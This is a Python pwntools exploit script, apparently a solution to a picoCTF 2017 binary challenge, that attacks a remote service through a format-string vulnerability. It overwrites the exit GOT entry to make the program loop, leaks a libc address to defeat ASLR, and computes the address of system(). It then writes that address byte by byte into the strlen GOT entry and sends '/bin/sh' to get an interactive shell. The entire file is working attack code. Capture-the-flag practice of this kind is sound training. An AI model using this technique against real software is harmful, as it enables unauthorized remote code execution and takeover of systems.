import struct
from pwn import *

#Pad function to make it constantly 1024 characters
#Keeps the stack consistent
#1024 - len(s) - 2 to account for 'e ' at the front
#Padded at the beginning because the GOT address has null byte
#and therefore must be at the end
def pad(s):
    return "X" * (1024 - len(s) - 2) + s

def recvuntil(st, s):
    buf = ''
    counter = 0
    #This is here so that your program doesn't randomly hang
    emptyCounter = 0
    while st not in buf:
        if emptyCounter == 10:
            break
        a = s.recv(4096).decode('utf-8')
        if len(a) == 0:
            emptyCounter += 1
        buf += a
        counter += 1
    return buf

#Set up socket
s = remote('shell2017.picoctf.com', 11496)
#Receive first line
recvuntil(':', s)

RELOOP_ADDR = 0x004009bd
GOT_EXIT_ADDR = 0x601258
#Value we want to write to the GOT address - 1014
FIRST_GOT_PAD = '4195798'
x = ''
x += '%' + FIRST_GOT_PAD + 'x'
#The address of 0x601258 is the 141st item on leaked stack
x += '%141$n'
x += struct.pack('I', GOT_EXIT_ADDR).decode('utf-8') + '\x00' * 4
#Send the first one to rewrite the GOT to reloop
s.send(('e ' + pad(x) + '\n').encode('utf-8'))
recvuntil('Config action:', s)
#The first libc function we find on the stack:
#<__libc_start_main+240>. Using readelf on the target system,
#we can figure out the offset for the function. We can also
#find the offset of system() the same way:
LIBC_START_MAIN_OFFSET = 0x21a50
SYSTEM_OFFSET = 0x41490
#Calculate the final offset:
OFFSET_FINAL = SYSTEM_OFFSET - LIBC_START_MAIN_OFFSET - 240

#We know through GDB and trial-and-error that the 286th value on the stack
#is the randomized address of <___libc_start_main+240>. Send and receive
#that address:
s.send(('e ' + pad('%289$p ' * 10) + '\n').encode('utf-8'))
address = int(recvuntil('Config action:', s).strip().split(' ')[4], 0)

print('Leaked address received: ' + hex(address))

#Calculate location of randomized system() function
jump_location = address + OFFSET_FINAL
#We can't simply rewrite EXIT_GOT to that value, is too large
#We also cannot manually write to it, since we can only use the EXIT_GOT
#address once. Thus, we need to write the value to the GOT of another function
#not called in the set_exit_message function.
#The strlen function in set_prompt will work.

STRLEN_GOT = 0x601210
print('Target write: ' + hex(jump_location))
print('Writing to STRLEN_GOT at 0x601210...')

#Perform 6 2-byte writes
jmp = hex(jump_location)[2:]
for write in range(0, len(jmp) // 2):
    hex_val = jmp[len(jmp) - ((write + 1) * 2):len(jmp) - (write * 2)]
    write_val = int(hex_val, 16)
    #For some weird reason, there seems to be a weird glitch with %n
    #Instead of writing the number of bytes correctly for all numbers 0-255,
    #printf hits an off-by-one error when you pad by 78. If you use
    #GDB, you'll notice that sending %77x -> %141$hnn both result in 4d being written.
    #That's why we need this if block. Not sure exactly why this off-by-one error occurs.
    if write_val > 77:
        write_val += 23
    else:
        write_val += 22
    print('Overwrite ' + str(write + 1) + ':')
    print('Hex value: ' + hex_val)
    print('Int value: ' + str(write_val))
    #Construct the exploit string
    w = ''
    w += '%' + str(write_val) + 'x'
    w += '%141$hhn'
    w += struct.pack('I', STRLEN_GOT + write).decode('utf-8') + '\x00' * 4
    s.send(('e ' + pad(w) + '\n').encode('utf-8'))
    recvuntil('Config action:', s)
    print('Write ' + str(write + 1) + ' complete.')

print('Executing system() call...')
s.send('p /bin/sh\n')

#We have shell
s.interactive()